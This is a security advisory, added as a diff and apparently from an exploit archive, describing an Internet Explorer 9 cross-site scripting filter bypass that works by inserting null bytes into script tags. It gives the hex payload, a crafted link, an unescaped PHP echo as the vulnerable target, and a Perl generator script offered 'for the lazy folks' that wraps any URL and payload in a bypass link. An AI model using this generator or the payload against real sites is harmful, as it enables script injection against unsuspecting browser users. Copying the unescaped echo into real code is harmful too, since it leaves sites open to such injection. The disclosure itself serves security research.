@@ -1,0 +1,147 @@
+#################################################
+Internet Explorer 9 XSS Filter Bypass
+#################################################
+ 
+Discovered by: Jean Pascal Pereira <pereira@secbiz.de>
+ 
+Vendor information:
+ 
+"Internet Explorer (formerly Microsoft Internet Explorer and Windows Internet Explorer, commonly 
+
+abbreviated IE or MSIE)
+is a series of graphical web browsers developed by Microsoft and included as part of the Microsoft 
+
+Windows line of operating
+systems, starting in 1995. It was first released as part of the add-on package Plus! for Windows 95 
+
+that year. Later versions
+were available as free downloads, or in service packs, and included in the OEM service releases of 
+
+Windows 95 and later versions of Windows.."
+ 
+Vendor URI: http://www.microsoft.com
+ 
+#################################################
+ 
+Issue: Cross Site Scripting Filter Bypass
+ 
+-------------------------------------
+
+Description:
+
+The Internet Explorer 9 offers a feature to eliminate suspicious pattern passed to the website by a 
+
+parameter.
+
+For example, we have the following script:
+
+-------------------------------------
+
+<?php
+
+echo $_GET['a'];
+
+?>
+
+-------------------------------------
+
+Let's call it "blah.php". Now we access the blah.php by using Internet Explorer 9 and try to execute a 
+
+malicious string:
+
+http://localhost/ieb/blah.php?a=<script>alert(1)</script>
+
+After this, we receive the message "Internet Explorer has modified this page to help prevent cross-
+
+site scripting".
+
+The JavaScript won't be executed.
+
+-------------------------------------
+ 
+Proof Of Concept:
+ 
+This trick may be known to some of you. Internet Explorer allows stripping tags by inserting 
+
+nullbytes.
+
+For example, the following string will be executed:
+
+3C 73 00 63 72 69 70 74 3E 61 6C 65 72 74 28 31 29 3C 2F 73 00 63 72 69 70 74 3E
+
+Which is actually "<s[NULL]cript>alert(1)</s[NULL]cript>".
+
+However, we won't be able to insert the nullbytes directly in the URI. The following example won't 
+
+work:
+
+http://localhost/ieb/blah.php?a=<s%00cript>alert(1)</s%00cript>
+
+But there is still another possibility. Grab a hex editor and create a file looking like the example 
+
+given below:
+
+<a href='http://localhost/ieb/blah.php?a=<s[NULL]cript>alert(1)</s[NULL]cript>'>Clickme</a>
+
+If you open the file and click the provided link, the script will be executed.
+ 
+-------------------------------------
+
+Exploit (for the lazy folks):
+
+-------------------------------------
+
+#!/usr/bin/perl
+
+use strict;
+use warnings;
+
+# Internet Explorer 9 XSS Filter Bypass Generator
+# Credit: Jean Pascal Pereira <pereira[at]secbiz.de>
+# http://0xffe4.org
+
+my $target  = shift || die("No target defined");
+my $payload = shift || die("No payload defined");
+my $lnk_txt = shift || "Click me :)";
+
+open(OUT, ">:raw", "out.html");
+
+print OUT "\x3C\x61\x20\x68\x72\x65\x66\x3D\x27";
+
+print OUT $target;
+
+print OUT "\x3C\x73\x00\x63\x72\x69\x70\x74\x3E";
+
+print OUT $payload;
+
+print OUT "\x3C\x2F\x73\x00\x63\x72\x69\x70\x74\x3E\x27\x3E";
+
+print OUT $lnk_txt;
+
+print OUT "\x3C\x2F\x61\x3E";
+
+close(OUT);
+
+-------------------------------------
+
+Example usage is:
+
+iefilter.pl http://www.example.com?var= alert(1)
+
+-------------------------------------
+
+Note:
+
+Exploitation via <a href="ja[NULL]vascript:... links is also possible.
+
+-------------------------------------
+ 
+Solution:
+ 
+Currently, no solution is available for this issue.
+ 
+-------------------------------------
+ 
+#################################################
+
+< http://0xffe4.org >
